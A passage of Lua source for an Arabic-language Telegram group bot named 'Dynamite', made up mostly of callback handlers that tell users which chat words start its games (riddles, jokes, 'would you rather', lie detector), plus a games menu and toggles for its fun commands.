https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help34' then
local Text = 'لتجربه العلبه عليك ان تكتب الحزوه في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help35' then
local Text = 'لتجربه العلبه عليك ان تكتب امثله في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help36' then
local Text = 'لتجربه العلبه عليك ان تكتب مريم في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help37' then
local Text = 'لتجربه العلبه عليك ان تكتب الرياضيات في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help38' then
local Text = 'لتجربه العلبه عليك ان تكتب السمايلات في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help39' then
local Text = 'لتجربه العلبه عليك ان تكتب العكس في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help40' then
local Text = 'لتجربه العلبه عليك ان تكتب الانكليزي في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help41' then
local Text = 'لتجربه العلبه عليك ان تكتب المعاني في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help42' then
local Text = 'لتجربه العلبه عليك ان تكتب عقاب في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help47' then
local Text = 'لتجربه العلبه عليك ان تكتب كشف الكذب في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
...
local Teext =[[
 𖣘مرحب  بك في مميزات سورس ديناميت 𖣘
...
if Text == '/help12' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help13' then
local Text = 'لتجربه العلبه عليك ان تكتب انصحني في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help14' then
local Text = 'لتجربه العلبه عليك ان تكتب الصراحه في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help15' then
local Text = 'لتجربه العلبه عليك ان تكتب رزله في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help16' then
local Text = 'لتجربه العلبه عليك ان تكتب بتكره دا في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help17' then
...
if Text == '/help18' then
local Text = 'لتجربه العلبه عليك ان تكتب نسبه جمالي في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help19' then
local Text = 'لتجربه العلبه عليك ان تكتب كتبات في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help20' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help21' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help22' then
local Text = 'لتجربه العلبه عليك ان تكتب رد عليه يابوت في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help23' then
local Text = 'لتجربه العلبه عليك ان تكتب نكته في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help24' then
...
if Text == '/help25' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك بالصور في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help56' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت بالصور في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
--- callback added
if Text == '/add' then
local Teext =[[
[𓆩| ıl` D E N A M E T ´lı |𓆪](t.me/Lo_ga_n1)
🎮 اهـلا بـك في قـسـم الالـعاب
🕹 أختـر الالـعاب الـذي تـريـدها في الاسـفل ↯
╾╾╾D╾E╾N╾A╾M╾E╾T╾╾╸
 ⦗[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)⦘
]]
keyboard = {} 
...
send(msg.chat_id_, msg.id_, ' 𖣘تـم تعـطيل أوامـر ألـتسليه يـا بـارد')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' 𖣘  تـم تـفـعيل أوامـر ألتـسليه يـا قـمر')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ديناميت')
...
if BANDA1_Msg then    
send(msg.chat_id_, msg.id_," 𖣘 "..BANDA1_Msg)
